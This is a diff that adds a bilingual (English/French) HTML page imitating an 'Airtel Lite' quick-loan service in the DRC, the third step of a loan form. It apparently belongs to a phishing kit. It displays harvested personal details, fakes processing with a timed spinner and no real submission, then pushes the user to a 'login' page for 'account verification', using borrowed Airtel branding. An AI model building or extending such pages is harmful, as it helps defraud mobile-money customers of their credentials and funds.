@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>lite.airtel.cd</title>
+    <link rel="icon" type="image/png" href="https://www.airtel.in/favicon.ico">
+    <meta name="description" content="Airtel Lite DRC – Top-up, Airtel Money, quick loans.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        html, body { height: 100%; font-family: 'Inter', system-ui, sans-serif; background: #ffffff; color: #000; }
+        body { min-height: 100vh; display: flex; flex-direction: column; }
+        header { background: #ED1C24; color: white; padding: 0.8rem 5%; box-shadow: 0 2px 6px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; }
+        .back-btn { font-size: 1.8rem; background: none; border: none; color: white; cursor: pointer; }
+        .logo { font-size: 1.8rem; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; }
+        .logo-airtel { color: white; }
+        .logo-lite { color: #FFD200; }
+        .airtel-logo-img { width: 28px; height: 28px; object-fit: contain; }
+        main { flex: 1; padding: 1rem 5% 2rem; overflow-y: auto; display: flex; justify-content: center; }
+        .form-card { background: #f8f9fa; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.06); padding: 1.5rem; width: 100%; max-width: 600px; display: flex; flex-direction: column; }
+        .top { flex: 1; overflow-y: auto; }
+        .form-title { font-size: 1.5rem; font-weight: 700; color: #ED1C24; text-align: center; margin-bottom: 1rem; }
+        .progress-bar { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; margin: 1rem 0; }
+        .progress-fill { width: 100%; height: 100%; background: #ED1C24; border-radius: 3px; }
+        .step-text { text-align: center; color: #555; font-size: 0.9rem; margin-bottom: 1.5rem; }
+        .form-group { margin-bottom: 1.2rem; }
+        .form-label { font-weight: 500; color: #222; margin-bottom: 0.4rem; font-size: 0.95rem; display: block; }
+        .form-input, .form-select { width: 100%; padding: 0.8rem 1rem; border: 1px solid #ccc; border-radius: 10px; font-size: 1rem; }
+        .form-input:focus, .form-select:focus { border-color: #ED1C24; outline: none; box-shadow: 0 0 0 3px rgba(237,28,36,0.15); }
+        .summary-box { background: #fff5f5; border-radius: 10px; padding: 1.2rem; margin: 1.5rem 0; }
+        .summary-row { display: flex; justify-content: space-between; margin-bottom: 0.8rem; color: #444; font-size: 0.95rem; }
+        .summary-row:last-child { margin-bottom: 0; }
+        .summary-value { font-weight: 700; color: #ED1C24; }
+        .btn-group { display: flex; gap: 1rem; margin-top: 1.5rem; }
+        .prev-btn, .submit-btn { flex: 1; padding: 0.9rem; border-radius: 10px; font-size: 1.05rem; font-weight: 600; cursor: pointer; }
+        .prev-btn { background: #e0e0e0; color: #222; border: none; }
+        .prev-btn:hover { background: #d0d0d0; }
+        .submit-btn { background: #ED1C24; color: white; border: none; }
+        .submit-btn:hover { background: #c8102e; }
+        footer { background: #000; color: #aaa; padding: 0.9rem 5%; text-align: center; font-size: 0.75rem; border-top: 3px solid #ED1C24; flex-shrink: 0; }
+        #spinnerOverlay { position: fixed; inset: 0; background: rgba(237,28,36,0.7); display: none; justify-content: center; align-items: center; z-index: 1000; flex-direction: column; }
+        .spinner { width: 60px; height: 60px; border: 6px solid rgba(255,255,255,0.2); border-top: 6px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 1.5rem; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #successOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .success-card { background: white; border-radius: 12px; padding: 2rem 1.5rem; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        .check-icon { width: 70px; height: 70px; background: #ED1C24; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 1rem; font-size: 2.5rem; color: white; font-weight: bold; }
+        .success-title { font-size: 1.4rem; font-weight: 700; color: #000; margin-bottom: 1rem; }
+        .success-msg { font-size: 0.95rem; color: #555; margin-bottom: 1.5rem; line-height: 1.5; }
+        .redirect-bar { background: #fff5f5; padding: 0.8rem; border-radius: 10px; font-size: 0.9rem; color: #444; margin-bottom: 1.2rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; }
+        .redirect-bar .loader { width: 18px; height: 18px; border: 3px solid #e0e0e0; border-top: 3px solid #ED1C24; border-radius: 50%; animation: spin 1s linear infinite; }
+        .go-login-btn { width: 100%; padding: 0.9rem; background: #ED1C24; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; }
+        .go-login-btn:hover { background: #c8102e; }
+        @media (max-width: 480px) { main { padding: 0.8rem 4%; } .form-card { padding: 1.2rem; } }
+    </style>
+</head>
+<body>
+<header>
+    <div class="header-container">
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo">
+            <span class="logo-airtel">Airtel</span>
+            <span class="logo-lite">Lite</span>
+            <img src="https://s3-ap-southeast-1.amazonaws.com/bsy/iportal/images/airtel-logo1.png" alt="Airtel Logo" class="airtel-logo-img">
+        </div>
+    </div>
+</header>
+
+<main>
+    <div class="form-card">
+        <div class="top">
+            <h2 class="form-title" id="formTitle">Final Verification</h2>
+            <div class="progress-bar"><div class="progress-fill"></div></div>
+            <div class="step-text" id="stepText">Step 3 of 3</div>
+
+            <!-- Employment Status -->
+            <div class="form-group">
+                <label class="form-label" id="empLabel">Employment Status</label>
+                <select class="form-select" id="employmentStatus">
+                    <option id="emp1">Employee</option>
+                    <option id="emp2">Self-employed / Entrepreneur</option>
+                    <option id="emp3">Unemployed</option>
+                    <option id="emp4">Student</option>
+                </select>
+            </div>
+
+            <!-- Annual Income (Optional) -->
+            <div class="form-group">
+                <label class="form-label" id="incomeLabel">Estimated Annual Income (CDF) <span style="color:#888;font-weight:400;">(Optional)</span></label>
+                <input type="number" class="form-input" id="annualIncome" placeholder="5000" min="0">
+            </div>
+
+            <!-- Summary Box -->
+            <div class="summary-box" id="summaryBox"></div>
+        </div>
+
+        <div class="btn-group">
+            <button class="prev-btn" id="prevBtn" onclick="history.back()">PREVIOUS</button>
+            <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+        </div>
+    </div>
+</main>
+
+<footer id="footerText">
+    © 2026 Airtel DRC. All rights reserved.<br>
+    Terms & Conditions • *123#
+</footer>
+
+<!-- Spinner -->
+<div id="spinnerOverlay">
+    <div class="spinner"></div>
+</div>
+
+<!-- Success Overlay -->
+<div id="successOverlay">
+    <div class="success-card">
+        <div class="check-icon">✓</div>
+        <div class="success-title" id="successTitle">Application Received</div>
+        <div class="success-msg" id="successMsg">
+            Your loan application has been successfully received.<br><br>
+            To complete the process and get your loan approved, please proceed to account verification.
+        </div>
+        <div class="redirect-bar">
+            <div class="loader"></div>
+            <span id="redirectText">Redirecting to verification in</span> <span id="countdown">3</span>...
+        </div>
+        <button class="go-login-btn" id="goLoginBtn" onclick="window.location.href='login'">Proceed to Verification</button>
+    </div>
+</div>
+
+<script>
+    // Redirect if no language selected
+    if (!localStorage.getItem('lang')) {
+        window.location.href = 'index';
+    }
+
+    const lang = localStorage.getItem('lang') || 'en';
+
+    const t = {
+        en: {
+            formTitle: "Final Verification",
+            stepText: "Step 3 of 3",
+            empLabel: "Employment Status",
+            emp1: "Employee",
+            emp2: "Self-employed / Entrepreneur",
+            emp3: "Unemployed",
+            emp4: "Student",
+            incomeLabel: "Estimated Annual Income (CDF)",
+            optional: "(Optional)",
+            prevBtn: "PREVIOUS",
+            submitBtn: "SUBMIT APPLICATION",
+            footer: "© 2026 Airtel DRC. All rights reserved.<br>Terms & Conditions • *123#",
+            successTitle: "Application Received",
+            successMsg: "Your loan application has been successfully received.<br><br>To complete the process and get your loan approved, please proceed to account verification.",
+            redirectText: "Redirecting to verification in",
+            goLoginBtn: "Proceed to Verification",
+            loanType: "Loan Type",
+            amount: "Amount",
+            duration: "Duration",
+            purpose: "Purpose",
+            fullName: "Full Name",
+            phone: "Phone",
+            email: "Email",
+            occupation: "Occupation",
+            months: "months",
+            notSpecified: "Not specified",
+            quickLoan: "Quick Loan"
+        },
+        fr: {
+            formTitle: "Vérification Finale",
+            stepText: "Étape 3 sur 3",
+            empLabel: "Statut professionnel",
+            emp1: "Salarié",
+            emp2: "Indépendant / Entrepreneur",
+            emp3: "Sans emploi",
+            emp4: "Étudiant",
+            incomeLabel: "Revenu annuel estimé (CDF)",
+            optional: "(Optionnel)",
+            prevBtn: "PRÉCÉDENT",
+            submitBtn: "SOUMETTRE LA DEMANDE",
+            footer: "© 2026 Airtel DRC. Tous droits réservés.<br>Conditions générales • *123#",
+            successTitle: "Demande reçue",
+            successMsg: "Votre demande de prêt a été reçue avec succès.<br><br>Pour finaliser le processus et obtenir l'approbation de votre prêt, veuillez procéder à la vérification du compte.",
+            redirectText: "Redirection vers la vérification dans",
+            goLoginBtn: "Procéder à la vérification",
+            loanType: "Type de prêt",
+            amount: "Montant",
+            duration: "Durée",
+            purpose: "Objectif",
+            fullName: "Nom complet",
+            phone: "Téléphone",
+            email: "Email",
+            occupation: "Profession",
+            months: "mois",
+            notSpecified: "Non spécifié",
+            quickLoan: "Prêt rapide"
+        }
+    };
+
+    const tr = t[lang];
+
+    // Apply translations
+    document.getElementById('formTitle').textContent = tr.formTitle;
+    document.getElementById('stepText').textContent = tr.stepText;
+    document.getElementById('empLabel').textContent = tr.empLabel;
+    document.getElementById('emp1').textContent = tr.emp1;
+    document.getElementById('emp2').textContent = tr.emp2;
+    document.getElementById('emp3').textContent = tr.emp3;
+    document.getElementById('emp4').textContent = tr.emp4;
+    document.getElementById('incomeLabel').innerHTML = tr.incomeLabel + ' <span style="color:#888;font-weight:400;">' + tr.optional + '</span>';
+    document.getElementById('prevBtn').textContent = tr.prevBtn;
+    document.getElementById('submitBtn').textContent = tr.submitBtn;
+    document.getElementById('footerText').innerHTML = tr.footer;
+    document.getElementById('successTitle').textContent = tr.successTitle;
+    document.getElementById('successMsg').innerHTML = tr.successMsg;
+    document.getElementById('redirectText').textContent = tr.redirectText;
+    document.getElementById('goLoginBtn').textContent = tr.goLoginBtn;
+
+    // Build summary box
+    const fullName = localStorage.getItem('fullName') || '';
+    const phone = localStorage.getItem('phoneNumber') || 'N/A';
+    const email = localStorage.getItem('email') || 'N/A';
+    const occupation = localStorage.getItem('occupation') || 'N/A';
+
+    document.getElementById('summaryBox').innerHTML = `
+        <div class="summary-row"><span>${tr.loanType} :</span><span class="summary-value">${localStorage.getItem('loanType') || tr.quickLoan}</span></div>
+        <div class="summary-row"><span>${tr.amount} :</span><span class="summary-value">CDF ${parseFloat(localStorage.getItem('loanAmount') || 0).toLocaleString()}</span></div>
+        <div class="summary-row"><span>${tr.duration} :</span><span class="summary-value">${localStorage.getItem('loanTerm') || '0'} ${tr.months}</span></div>
+        <div class="summary-row"><span>${tr.purpose} :</span><span class="summary-value">${localStorage.getItem('loanPurpose') || tr.notSpecified}</span></div>
+        <div class="summary-row"><span>${tr.fullName} :</span><span class="summary-value">${fullName}</span></div>
+        <div class="summary-row"><span>${tr.phone} :</span><span class="summary-value">${phone}</span></div>
+        <div class="summary-row"><span>${tr.email} :</span><span class="summary-value">${email}</span></div>
+        <div class="summary-row"><span>${tr.occupation} :</span><span class="summary-value">${occupation}</span></div>
+    `;
+
+    // Restore previous values if any
+    if (localStorage.getItem('employmentStatus')) {
+        document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
+    }
+    if (localStorage.getItem('annualIncome')) {
+        document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
+    }
+
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+    const successOverlay = document.getElementById('successOverlay');
+
+    // Submit button – Annual Income is optional
+    document.getElementById('submitBtn').addEventListener('click', function() {
+        const income = document.getElementById('annualIncome').value.trim();
+
+        localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
+        localStorage.setItem('annualIncome', income || '');
+
+        // Show spinner
+        spinnerOverlay.style.display = 'flex';
+
+        setTimeout(() => {
+            spinnerOverlay.style.display = 'none';
+            successOverlay.style.display = 'flex';
+
+            let seconds = 3;
+            const countdownEl = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                seconds--;
+                countdownEl.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    window.location.href = 'login';
+                }
+            }, 1000);
+        }, 3000);
+    });
+</script>
+</body>
+</html>
